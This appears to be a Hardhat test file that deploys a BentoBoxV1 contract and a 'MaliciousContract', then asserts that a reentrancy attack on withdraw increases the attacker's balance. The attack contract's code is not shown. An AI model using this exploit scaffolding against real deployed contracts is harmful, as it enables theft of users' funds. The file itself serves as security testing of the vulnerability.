const { ethers } = require("hardhat");
const { expect } = require("chai");

const WETH_ADDRESS = "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83";


describe("BentoBoxV1 Reentrancy Attack Test", function () {
    let deployer, attacker;
    let bentoBox, maliciousContract;

    before(async function () {
        [deployer, attacker] = await ethers.getSigners();

        // Deploy BentoBoxV1 with MockWETH (ensure MockWETH is deployed if needed)
        const BentoBox = await ethers.getContractFactory("BentoBoxV1");
        bentoBox = await BentoBox.deploy(WETH_ADDRESS);
        await bentoBox.deployed();

        // Deploy MaliciousContract targeting BentoBoxV1 (for reentrancy test)
        const MaliciousContract = await ethers.getContractFactory("MaliciousContract", attacker);
        maliciousContract = await MaliciousContract.deploy(bentoBox.address);
        await maliciousContract.deployed();
    });

    it("should exploit reentrancy vulnerability in withdraw", async function () {
        const initialBalance = await ethers.provider.getBalance(attacker.address);
        console.log("Attacker initial balance:", initialBalance.toString());

        // Initiate the attack
        await maliciousContract.connect(attacker).attack();

        const finalBalance = await ethers.provider.getBalance(attacker.address);
        console.log("Attacker final balance:", finalBalance.toString());

        // Assert the balance increased due to reentrancy attack
        expect(finalBalance).to.be.gt(initialBalance);
    });
});
